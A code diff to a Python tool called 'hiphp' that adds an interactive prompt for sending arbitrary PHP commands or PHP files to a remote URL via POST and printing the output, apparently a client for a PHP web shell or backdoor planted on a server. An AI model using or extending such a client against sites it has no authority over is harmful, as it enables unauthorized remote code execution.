@@ -25,20 +25,48 @@ class hiphp:
                 print(hiphp.Get_code(abc.key))
         else:
             print("We were unable to recognize the hiphp identifier.")
-            
+    #post:
+    def post(url,headers,command):
+        ploads={'command':command}#open('php.php').read()
+        response=requests.post(url,headers=headers,data=ploads)
+        return response
+        
+    #check_errors:
+    def check_errors(response):
+        if response[7:13]!="<br />":
+            print(response[7:])
+        else:
+            print('ERROR in command line.')
+    
+    #help:    
+    def help():
+        print("  -h             | help              -> Help list.")
+        print("  -e             | exit              -> Exit.")
+        print("  -c <PASSWORD>  | create <PASSWORD> -> Create new code")
+        print("  -f <FILE_PATH> | file <FILE_PATH>  -> Executing php file in the terminal.")
+        print("  <PHP_COMMAND>                      -> Executing php commands in the terminal")
+    
     #input_command:
     def input_command(url,headers):
         c=input('hiphp>>>')
         if c:
-            if c[0:2]=='-c':
+            if c[0:2]=='-c' or c[0:6]=='create':
                 print(hiphp.Get_code(ashar(c[3:],c[3:]).encode()))
+            elif c[0:2]=='-f' or c[0:4]=='file':
+                open_file=open(c[3:]).read()
+                if open_file[0:5]=="<?php":
+                    open_file=open_file[6:]
+                if open_file[len(open_file)-2:len(open_file)]=="?>":
+                    open_file=open_file[:len(open_file)-2]
+                response=hiphp.post(url,headers,open_file)
+                hiphp.check_errors(response.text)
+            elif c[0:2]=='-h' or c[0:4]=='help':
+                hiphp.help()
+            elif c[0:2]=='-e' or c[0:4]=='exit':
+                exit()
             else:
-                ploads={'command':c}#open('php.php').read()
-                response=requests.post(url,headers=headers,data=ploads)
-                if response.text[7:13]!="<br />":
-                    print(response.text[7:])
-                else:
-                    print('ERROR in command line')
+                response=hiphp.post(url,headers,c)
+                hiphp.check_errors(response.text)
         else:
 	        print('Command not found!')
         hiphp.input_command(url,headers)
